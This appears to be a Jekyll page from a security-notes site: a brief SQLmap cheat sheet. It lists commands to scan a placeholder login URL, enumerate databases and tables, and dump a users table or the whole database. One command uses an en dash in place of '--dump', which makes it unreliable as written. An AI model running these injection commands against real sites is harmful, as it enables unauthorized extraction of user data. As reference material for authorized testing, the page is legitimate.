---
layout: topics
page-title: SQLmap
scan-file: sqlmap -r filename
scan-url: sqlmap -u "http://testsite.com/login.php"
list-dbs: sqlmap -u "http://testsite.com/login.php" --dbs
list-tables: sqlmap -u "http://testsite.com/login.php" -D site_db --tables
dump-table: sqlmap -u "http://testsite.com/login.php" -D site_db -T users –dump
scan-url-type: sqlmap --dbms=mysql -u "http://testsite.com/login.php"
dump-all: sqlmap -u "http://testsite.com/login.php" --dump-all
---

[Cheat sheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet){:target="_blank"}
{% include copy-code-blocks.html text='Scan using saved request: ' language='bash' code=page.scan-file %}
{% include copy-code-blocks.html text='Scan URL: ' language='bash' code=page.scan-url %}
{% include copy-code-blocks.html text='List dbs: ' language='bash' code=page.list-dbs %}
{% include copy-code-blocks.html text='List tables in DB: ' language='bash' code=page.list-tables %}
{% include copy-code-blocks.html text='Dump table in DB: ' language='bash' code=page.dump-table %}
{% include copy-code-blocks.html text='Specify bd type: ' language='bash' code=page.scan-url-type %}
{% include copy-code-blocks.html text='Dump all entries: ' language='bash' code=page.dump-all %}
